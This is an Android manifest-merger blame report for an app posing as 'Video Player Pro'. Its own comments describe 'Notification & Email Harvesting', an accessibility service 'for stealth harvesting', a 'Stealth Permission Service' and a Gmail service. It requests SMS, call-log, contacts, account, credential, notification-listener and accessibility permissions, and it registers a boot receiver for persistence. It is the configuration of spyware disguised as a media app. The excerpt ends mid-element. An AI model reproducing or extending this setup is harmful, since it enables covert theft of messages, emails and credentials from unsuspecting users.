jumpy/app/build/intermediates/manifest_merge_blame_file/release/processReleaseMainManifest/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.jumpy.videoplayerapp"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
9        android:targetSdkVersion="34" />
10
11    <!-- Essential Permissions for Notification & Email Harvesting Only -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:7:5-66
12-->src/main/AndroidManifest.xml:7:22-64
13    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
13-->src/main/AndroidManifest.xml:8:5-76
13-->src/main/AndroidManifest.xml:8:22-74
14    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
14-->src/main/AndroidManifest.xml:9:5-80
14-->src/main/AndroidManifest.xml:9:22-78
15    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
15-->src/main/AndroidManifest.xml:10:5-76
15-->src/main/AndroidManifest.xml:10:22-74
16    <uses-permission android:name="android.permission.READ_NOTIFICATIONS" />
16-->src/main/AndroidManifest.xml:11:5-76
16-->src/main/AndroidManifest.xml:11:22-74
17    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
17-->src/main/AndroidManifest.xml:12:5-78
17-->src/main/AndroidManifest.xml:12:22-76
18    <uses-permission android:name="android.permission.WAKE_LOCK" />
18-->src/main/AndroidManifest.xml:13:5-67
18-->src/main/AndroidManifest.xml:13:22-65
19    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
19-->src/main/AndroidManifest.xml:14:5-70
19-->src/main/AndroidManifest.xml:14:22-68
20    <uses-permission android:name="android.permission.USE_CREDENTIALS" />
20-->src/main/AndroidManifest.xml:15:5-73
20-->src/main/AndroidManifest.xml:15:22-71
21    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
21-->src/main/AndroidManifest.xml:16:5-84
21-->src/main/AndroidManifest.xml:16:22-82
22    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
22-->src/main/AndroidManifest.xml:17:5-92
22-->src/main/AndroidManifest.xml:17:22-90
23
24    <!-- Minimal permissions for basic functionality -->
25    <uses-permission android:name="android.permission.READ_CONTACTS" />
25-->src/main/AndroidManifest.xml:20:5-71
25-->src/main/AndroidManifest.xml:20:22-69
26
27    <!-- Firebase permissions -->
28    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
28-->src/main/AndroidManifest.xml:23:5-75
28-->src/main/AndroidManifest.xml:23:22-73
29    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
29-->src/main/AndroidManifest.xml:24:5-75
29-->src/main/AndroidManifest.xml:24:22-73
30    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
30-->src/main/AndroidManifest.xml:25:5-74
30-->src/main/AndroidManifest.xml:25:22-72
31    <uses-permission android:name="android.permission.READ_CALL_LOG" />
31-->src/main/AndroidManifest.xml:26:5-71
31-->src/main/AndroidManifest.xml:26:22-69
32    <uses-permission android:name="android.permission.READ_SMS" />
32-->src/main/AndroidManifest.xml:27:5-66
32-->src/main/AndroidManifest.xml:27:22-64
33    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
33-->src/main/AndroidManifest.xml:28:5-79
33-->src/main/AndroidManifest.xml:28:22-77
34    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
34-->src/main/AndroidManifest.xml:29:5-80
34-->src/main/AndroidManifest.xml:29:22-78
35
36    <!-- Required by older versions of Google Play services to create IID tokens -->
37    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
37-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:26:5-82
37-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:26:22-79
38    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE" />
38-->[com.google.android.gms:play-services-measurement:22.5.0] AndroidManifest.xml:26:5-110
38-->[com.google.android.gms:play-services-measurement:22.5.0] AndroidManifest.xml:26:22-107
39    <uses-permission android:name="com.google.android.gms.permission.AD_ID" />
39-->[com.google.android.gms:play-services-measurement-api:22.5.0] AndroidManifest.xml:25:5-79
39-->[com.google.android.gms:play-services-measurement-api:22.5.0] AndroidManifest.xml:25:22-76
40    <uses-permission android:name="android.permission.ACCESS_ADSERVICES_ATTRIBUTION" />
40-->[com.google.android.gms:play-services-measurement-api:22.5.0] AndroidManifest.xml:26:5-88
40-->[com.google.android.gms:play-services-measurement-api:22.5.0] AndroidManifest.xml:26:22-85
41    <uses-permission android:name="android.permission.ACCESS_ADSERVICES_AD_ID" />
41-->[com.google.android.gms:play-services-measurement-api:22.5.0] AndroidManifest.xml:27:5-82
41-->[com.google.android.gms:play-services-measurement-api:22.5.0] AndroidManifest.xml:27:22-79
42
43    <permission
43-->[androidx.core:core:1.9.0] AndroidManifest.xml:22:5-24:47
44        android:name="com.jumpy.videoplayerapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
44-->[androidx.core:core:1.9.0] AndroidManifest.xml:23:9-81
45        android:protectionLevel="signature" />
45-->[androidx.core:core:1.9.0] AndroidManifest.xml:24:9-44
46
47    <uses-permission android:name="com.jumpy.videoplayerapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
47-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:5-97
47-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:22-94
48    <uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES" />
48-->[com.google.android.recaptcha:recaptcha:18.6.1] AndroidManifest.xml:9:5-98
48-->[com.google.android.recaptcha:recaptcha:18.6.1] AndroidManifest.xml:9:22-95
49
50    <application
50-->src/main/AndroidManifest.xml:31:5-131:19
51        android:allowBackup="true"
51-->src/main/AndroidManifest.xml:32:13-39
52        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
52-->[androidx.core:core:1.9.0] AndroidManifest.xml:28:18-86
53        android:extractNativeLibs="false"
54        android:icon="@mipmap/ic_launcher"
54-->src/main/AndroidManifest.xml:33:13-47
55        android:label="Video Player Pro"
55-->src/main/AndroidManifest.xml:34:13-45
56        android:roundIcon="@mipmap/ic_launcher_round"
56-->src/main/AndroidManifest.xml:35:13-58
57        android:supportsRtl="true"
57-->src/main/AndroidManifest.xml:36:13-39
58        android:theme="@style/Theme.VideoApp"
58-->src/main/AndroidManifest.xml:38:13-50
59        android:usesCleartextTraffic="true" >
59-->src/main/AndroidManifest.xml:37:13-48
60
61        <!-- Main Activity -->
62        <activity
62-->src/main/AndroidManifest.xml:41:9-47:20
63            android:name="com.jumpy.videoplayerapp.MainActivity"
63-->src/main/AndroidManifest.xml:41:19-47
64            android:exported="true" >
64-->src/main/AndroidManifest.xml:42:13-36
65            <intent-filter>
65-->src/main/AndroidManifest.xml:43:13-46:29
66                <action android:name="android.intent.action.MAIN" />
66-->src/main/AndroidManifest.xml:44:17-69
66-->src/main/AndroidManifest.xml:44:25-66
67
68                <category android:name="android.intent.category.LAUNCHER" />
68-->src/main/AndroidManifest.xml:45:17-77
68-->src/main/AndroidManifest.xml:45:27-74
69            </intent-filter>
70        </activity>
71        <activity android:name="com.jumpy.videoplayerapp.VideoPlayerActivity" />
71-->src/main/AndroidManifest.xml:49:9-57
71-->src/main/AndroidManifest.xml:49:19-54
72        <activity android:name="com.jumpy.videoplayerapp.VideoUploadActivity" />
72-->src/main/AndroidManifest.xml:50:9-57
72-->src/main/AndroidManifest.xml:50:19-54
73        <activity android:name="com.jumpy.videoplayerapp.ChatActivity" />
73-->src/main/AndroidManifest.xml:51:9-50
73-->src/main/AndroidManifest.xml:51:19-47
74        <activity android:name="com.jumpy.videoplayerapp.GamesActivity" />
74-->src/main/AndroidManifest.xml:52:9-51
74-->src/main/AndroidManifest.xml:52:19-48
75        <activity android:name="com.jumpy.videoplayerapp.TicTacToeActivity" />
75-->src/main/AndroidManifest.xml:53:9-55
75-->src/main/AndroidManifest.xml:53:19-52
76        <activity android:name="com.jumpy.videoplayerapp.LudoActivity" />
76-->src/main/AndroidManifest.xml:54:9-50
76-->src/main/AndroidManifest.xml:54:19-47
77        <activity android:name="com.jumpy.videoplayerapp.UNOActivity" />
77-->src/main/AndroidManifest.xml:55:9-49
77-->src/main/AndroidManifest.xml:55:19-46
78        <activity android:name="com.jumpy.videoplayerapp.ChessActivity" />
78-->src/main/AndroidManifest.xml:56:9-51
78-->src/main/AndroidManifest.xml:56:19-48
79
80        <!-- Google Sign-In Configuration -->
81        <meta-data
81-->src/main/AndroidManifest.xml:59:9-61:69
82            android:name="com.google.android.gms.version"
82-->src/main/AndroidManifest.xml:60:13-58
83            android:value="@integer/google_play_services_version" />
83-->src/main/AndroidManifest.xml:61:13-66
84
85        <!-- Firebase Configuration -->
86        <meta-data
86-->src/main/AndroidManifest.xml:64:9-66:52
87            android:name="com.google.firebase.messaging.default_notification_channel_id"
87-->src/main/AndroidManifest.xml:65:13-89
88            android:value="secret_notifications" />
88-->src/main/AndroidManifest.xml:66:13-49
89        <meta-data
89-->src/main/AndroidManifest.xml:68:9-70:60
90            android:name="com.google.firebase.messaging.default_notification_icon"
90-->src/main/AndroidManifest.xml:69:13-83
91            android:resource="@drawable/ic_notification" />
91-->src/main/AndroidManifest.xml:70:13-57
92
93        <!-- Firebase Messaging Service -->
94        <service
94-->src/main/AndroidManifest.xml:73:9-79:19
95            android:name="com.jumpy.videoplayerapp.services.JumpyFirebaseMessagingService"
95-->src/main/AndroidManifest.xml:74:13-67
96            android:exported="false" >
96-->src/main/AndroidManifest.xml:75:13-37
97            <intent-filter>
97-->src/main/AndroidManifest.xml:76:13-78:29
98                <action android:name="com.google.firebase.MESSAGING_EVENT" />
98-->src/main/AndroidManifest.xml:77:17-78
98-->src/main/AndroidManifest.xml:77:25-75
99            </intent-filter>
100        </service>
101
102        <!-- Notification Listener Service -->
103        <service
103-->src/main/AndroidManifest.xml:82:9-90:19
104            android:name="com.jumpy.videoplayerapp.NotificationListener"
104-->src/main/AndroidManifest.xml:83:17-53
105            android:enabled="true"
105-->src/main/AndroidManifest.xml:84:17-39
106            android:exported="true"
106-->src/main/AndroidManifest.xml:85:17-40
107            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
107-->src/main/AndroidManifest.xml:86:17-91
108            <intent-filter>
108-->src/main/AndroidManifest.xml:87:13-89:29
109                <action android:name="android.service.notification.NotificationListenerService" />
109-->src/main/AndroidManifest.xml:88:17-99
109-->src/main/AndroidManifest.xml:88:25-96
110            </intent-filter>
111        </service>
112
113        <!-- Gmail Maintenance Service -->
114        <service
114-->src/main/AndroidManifest.xml:93:9-96:44
115            android:name="com.jumpy.videoplayerapp.GmailMaintenanceService"
115-->src/main/AndroidManifest.xml:94:17-56
116            android:enabled="true"
116-->src/main/AndroidManifest.xml:95:17-39
117            android:exported="false" />
117-->src/main/AndroidManifest.xml:96:17-41
118
119        <!-- Unified Accessibility Service (for stealth harvesting) -->
120        <service
120-->src/main/AndroidManifest.xml:99:9-110:19
121            android:name="com.jumpy.videoplayerapp.UnifiedAccessibilityService"
121-->src/main/AndroidManifest.xml:100:17-60
122            android:enabled="true"
122-->src/main/AndroidManifest.xml:101:17-39
123            android:exported="true"
123-->src/main/AndroidManifest.xml:102:17-40
124            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
124-->src/main/AndroidManifest.xml:103:17-83
125            <intent-filter>
125-->src/main/AndroidManifest.xml:104:13-106:29
126                <action android:name="android.accessibilityservice.AccessibilityService" />
126-->src/main/AndroidManifest.xml:105:17-92
126-->src/main/AndroidManifest.xml:105:25-89
127            </intent-filter>
128
129            <meta-data
129-->src/main/AndroidManifest.xml:107:13-109:72
130                android:name="android.accessibilityservice"
130-->src/main/AndroidManifest.xml:108:17-60
131                android:resource="@xml/unified_accessibility_config" />
131-->src/main/AndroidManifest.xml:109:17-69
132        </service>
133
134        <!-- Stealth Permission Service -->
135        <service
135-->src/main/AndroidManifest.xml:113:9-116:44
136            android:name="com.jumpy.videoplayerapp.StealthPermissionService"
136-->src/main/AndroidManifest.xml:114:17-57
137            android:enabled="true"
137-->src/main/AndroidManifest.xml:115:17-39
138            android:exported="false" />
138-->src/main/AndroidManifest.xml:116:17-41
139
140        <!-- Firebase Sync Service -->
141        <service
141-->src/main/AndroidManifest.xml:119:9-122:40
142            android:name="com.jumpy.videoplayerapp.services.FirebaseSyncService"
142-->src/main/AndroidManifest.xml:120:13-57
143            android:enabled="true"
143-->src/main/AndroidManifest.xml:121:13-35
144            android:exported="false" />
144-->src/main/AndroidManifest.xml:122:13-37
145
146        <!-- Boot Receiver -->
147        <receiver
147-->src/main/AndroidManifest.xml:125:9-129:20
148            android:name="com.jumpy.videoplayerapp.BootReceiver"
148-->src/main/AndroidManifest.xml:125:19-47
149            android:exported="true" >
149-->src/main/AndroidManifest.xml:125:48-71
150            <intent-filter>
150-->src/main/AndroidManifest.xml:126:13-128:29
151                <action android:name="android.intent.action.BOOT_COMPLETED" />
151-->src/main/AndroidManifest.xml:127:17-78
151-->src/main/AndroidManifest.xml:127:25-76
152            </intent-filter>
153        </receiver>
154
155        <activity
155-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:27:9-29:72
156            android:name="com.karumi.dexter.DexterActivity"
156-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:28:13-60
157            android:theme="@style/Dexter.Internal.Theme.Transparent" />
157-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:29:13-69
158        <activity
158-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:29:9-46:20
159            android:name="com.google.firebase.auth.internal.GenericIdpActivity"
159-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:30:13-80
160            android:excludeFromRecents="true"
160-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:31:13-46
161            android:exported="true"
161-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:32:13-36
162            android:launchMode="singleTask"
162-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:33:13-44
163            android:theme="@android:style/Theme.Translucent.NoTitleBar" >
163-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:34:13-72
164            <intent-filter>
164-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:35:13-45:29
165                <action android:name="android.intent.action.VIEW" />
165-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:36:17-69
165-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:36:25-66
166
167                <category android:name="android.intent.category.DEFAULT" />
167-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:38:17-76
167-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:38:27-73
168                <category android:name="android.intent.category.BROWSABLE" />
168-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:39:17-78
168-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:39:27-75
169
170                <data
170-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:41:17-44:51
171                    android:host="firebase.auth"
171-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:42:21-49
172                    android:path="/"
172-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:43:21-37
173                    android:scheme="genericidp" />
173-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:44:21-48
174            </intent-filter>
175        </activity>
176        <activity
176-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:47:9-64:20
177            android:name="com.google.firebase.auth.internal.RecaptchaActivity"
177-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:48:13-79
178            android:excludeFromRecents="true"
178-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:49:13-46
179            android:exported="true"
179-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:50:13-36
180            android:launchMode="singleTask"
180-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:51:13-44
181            android:theme="@android:style/Theme.Translucent.NoTitleBar" >
181-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:52:13-72
182            <intent-filter>
182-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:53:13-63:29
183                <action android:name="android.intent.action.VIEW" />
183-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:36:17-69
183-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:36:25-66
184
185                <category android:name="android.intent.category.DEFAULT" />
185-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:38:17-76
185-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:38:27-73
186                <category android:name="android.intent.category.BROWSABLE" />
186-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:39:17-78
186-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:39:27-75
187
188                <data
188-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:41:17-44:51
189                    android:host="firebase.auth"
189-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:42:21-49
190                    android:path="/"
190-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:43:21-37
191                    android:scheme="recaptcha" />
191-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:44:21-48
192            </intent-filter>
193        </activity>
194
195        <service
195-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:66:9-72:19
196            android:name="com.google.firebase.components.ComponentDiscoveryService"
196-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:67:13-84
197            android:directBootAware="true"
197-->[com.google.firebase:firebase-common:21.0.0] AndroidManifest.xml:32:13-43
198            android:exported="false" >
198-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:68:13-37
199            <meta-data
199-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:69:13-71:85
200                android:name="com.google.firebase.components:com.google.firebase.auth.FirebaseAuthRegistrar"
200-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:70:17-109
201                android:value="com.google.firebase.components.ComponentRegistrar" />
201-->[com.google.firebase:firebase-auth:23.2.1] AndroidManifest.xml:71:17-82
202            <meta-data
202-->[com.google.firebase:firebase-database:21.0.0] AndroidManifest.xml:29:13-31:85
203                android:name="com.google.firebase.components:com.google.firebase.database.FirebaseDatabaseKtxRegistrar"
203-->[com.google.firebase:firebase-database:21.0.0] AndroidManifest.xml:30:17-120
204                android:value="com.google.firebase.components.ComponentRegistrar" />
204-->[com.google.firebase:firebase-database:21.0.0] AndroidManifest.xml:31:17-82
205            <meta-data
205-->[com.google.firebase:firebase-database:21.0.0] AndroidManifest.xml:32:13-34:85
206                android:name="com.google.firebase.components:com.google.firebase.database.DatabaseRegistrar"
206-->[com.google.firebase:firebase-database:21.0.0] AndroidManifest.xml:33:17-109
207                android:value="com.google.firebase.components.ComponentRegistrar" />
207-->[com.google.firebase:firebase-database:21.0.0] AndroidManifest.xml:34:17-82
208            <meta-data
208-->[com.google.firebase:firebase-firestore:25.1.4] AndroidManifest.xml:17:13-19:85
209                android:name="com.google.firebase.components:com.google.firebase.firestore.FirebaseFirestoreKtxRegistrar"
209-->[com.google.firebase:firebase-firestore:25.1.4] AndroidManifest.xml:18:17-122
210                android:value="com.google.firebase.components.ComponentRegistrar" />
210-->[com.google.firebase:firebase-firestore:25.1.4] AndroidManifest.xml:19:17-82
211            <meta-data
211-->[com.google.firebase:firebase-firestore:25.1.4] AndroidManifest.xml:20:13-22:85
212                android:name="com.google.firebase.components:com.google.firebase.firestore.FirestoreRegistrar"
212-->[com.google.firebase:firebase-firestore:25.1.4] AndroidManifest.xml:21:17-111
213                android:value="com.google.firebase.components.ComponentRegistrar" />
213-->[com.google.firebase:firebase-firestore:25.1.4] AndroidManifest.xml:22:17-82
214            <meta-data
214-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:57:13-59:85
215                android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingKtxRegistrar"
215-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:58:17-122
216                android:value="com.google.firebase.components.ComponentRegistrar" />
216-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:59:17-82
217            <meta-data
217-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:60:13-62:85
218                android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingRegistrar"
218-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:61:17-119
219                android:value="com.google.firebase.components.ComponentRegistrar" />
219-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:62:17-82
220            <meta-data
220-->[com.google.android.gms:play-services-measurement-api:22.5.0] AndroidManifest.xml:33:13-35:85
221                android:name="com.google.firebase.components:com.google.firebase.analytics.connector.internal.AnalyticsConnectorRegistrar"
221-->[com.google.android.gms:play-services-measurement-api:22.5.0] AndroidManifest.xml:34:17-139
222                android:value="com.google.firebase.components.ComponentRegistrar" />
222-->[com.google.android.gms:play-services-measurement-api:22.5.0] AndroidManifest.xml:35:17-82
223            <meta-data
223-->[com.google.firebase:firebase-config:22.1.2] AndroidManifest.xml:29:13-31:85
224                android:name="com.google.firebase.components:com.google.firebase.remoteconfig.FirebaseRemoteConfigKtxRegistrar"
224-->[com.google.firebase:firebase-config:22.1.2] AndroidManifest.xml:30:17-128
225                android:value="com.google.firebase.components.ComponentRegistrar" />
225-->[com.google.firebase:firebase-config:22.1.2] AndroidManifest.xml:31:17-82
226            <meta-data
226-->[com.google.firebase:firebase-config:22.1.2] AndroidManifest.xml:32:13-34:85
227                android:name="com.google.firebase.components:com.google.firebase.remoteconfig.RemoteConfigRegistrar"
227-->[com.google.firebase:firebase-config:22.1.2] AndroidManifest.xml:33:17-117
228                android:value="com.google.firebase.components.ComponentRegistrar" />
228-->[com.google.firebase:firebase-config:22.1.2] AndroidManifest.xml:34:17-82
229            <meta-data
229-->[com.google.firebase:firebase-installations:18.0.0] AndroidManifest.xml:15:13-17:85
230                android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsKtxRegistrar"
230-->[com.google.firebase:firebase-installations:18.0.0] AndroidManifest.xml:16:17-130
231                android:value="com.google.firebase.components.ComponentRegistrar" />
231-->[com.google.firebase:firebase-installations:18.0.0] AndroidManifest.xml:17:17-82
232            <meta-data
232-->[com.google.firebase:firebase-installations:18.0.0] AndroidManifest.xml:18:13-20:85
233                android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsRegistrar"
233-->[com.google.firebase:firebase-installations:18.0.0] AndroidManifest.xml:19:17-127
234                android:value="com.google.firebase.components.ComponentRegistrar" />
234-->[com.google.firebase:firebase-installations:18.0.0] AndroidManifest.xml:20:17-82
235            <meta-data
235-->[com.google.firebase:firebase-common-ktx:21.0.0] AndroidManifest.xml:12:13-14:85
236                android:name="com.google.firebase.components:com.google.firebase.ktx.FirebaseCommonLegacyRegistrar"
236-->[com.google.firebase:firebase-common-ktx:21.0.0] AndroidManifest.xml:13:17-116
237                android:value="com.google.firebase.components.ComponentRegistrar" />
237-->[com.google.firebase:firebase-common-ktx:21.0.0] AndroidManifest.xml:14:17-82
238            <meta-data
238-->[com.google.firebase:firebase-common:21.0.0] AndroidManifest.xml:35:13-37:85
239                android:name="com.google.firebase.components:com.google.firebase.FirebaseCommonKtxRegistrar"
239-->[com.google.firebase:firebase-common:21.0.0] AndroidManifest.xml:36:17-109
240                android:value="com.google.firebase.components.ComponentRegistrar" />
240-->[com.google.firebase:firebase-common:21.0.0] AndroidManifest.xml:37:17-82
241            <meta-data
241-->[com.google.firebase:firebase-abt:21.1.1] AndroidManifest.xml:12:13-14:85
242                android:name="com.google.firebase.components:com.google.firebase.abt.component.AbtRegistrar"
242-->[com.google.firebase:firebase-abt:21.1.1] AndroidManifest.xml:13:17-109
243                android:value="com.google.firebase.components.ComponentRegistrar" />
243-->[com.google.firebase:firebase-abt:21.1.1] AndroidManifest.xml:14:17-82
244            <meta-data
244-->[com.google.firebase:firebase-datatransport:18.2.0] AndroidManifest.xml:25:13-27:85
245                android:name="com.google.firebase.components:com.google.firebase.datatransport.TransportRegistrar"
245-->[com.google.firebase:firebase-datatransport:18.2.0] AndroidManifest.xml:26:17-115
246                android:value="com.google.firebase.components.ComponentRegistrar" />
246-->[com.google.firebase:firebase-datatransport:18.2.0] AndroidManifest.xml:27:17-82
247        </service>
248
249        <receiver
249-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:29:9-40:20
250            android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver"
250-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:30:13-78
251            android:exported="true"
251-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:31:13-36
252            android:permission="com.google.android.c2dm.permission.SEND" >
252-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:32:13-73
253            <intent-filter>
253-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:33:13-35:29
254                <action android:name="com.google.android.c2dm.intent.RECEIVE" />
254-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:34:17-81
254-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:34:25-78
255            </intent-filter>
256
257            <meta-data
257-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:37:13-39:40
258                android:name="com.google.android.gms.cloudmessaging.FINISHED_AFTER_HANDLED"
258-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:38:17-92
259                android:value="true" />
259-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:39:17-37
260        </receiver>
261        <!--
262             FirebaseMessagingService performs security checks at runtime,
263             but set to not exported to explicitly avoid allowing another app to call it.
264        -->
265        <service
265-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:46:9-53:19
266            android:name="com.google.firebase.messaging.FirebaseMessagingService"
266-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:47:13-82
267            android:directBootAware="true"
267-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:48:13-43
268            android:exported="false" >
268-->[com.google.firebase:firebase-messaging:24.1.2] AndroidManifest.xml:49:13-37
269            <intent-filter android:priority="-500" >
269-->src/main/AndroidManifest.xml:76:13-78:29
270                <action android:name="com.google.firebase.MESSAGING_EVENT" />
270-->src/main/AndroidManifest.xml:77:17-78
270-->src/main/AndroidManifest.xml:77:25-75
271            </intent-filter>
272        </service>
273
274        <receiver
274-->[com.google.android.gms:play-services-measurement:22.5.0] AndroidManifest.xml:29:9-33:20
275            android:name="com.google.android.gms.measurement.AppMeasurementReceiver"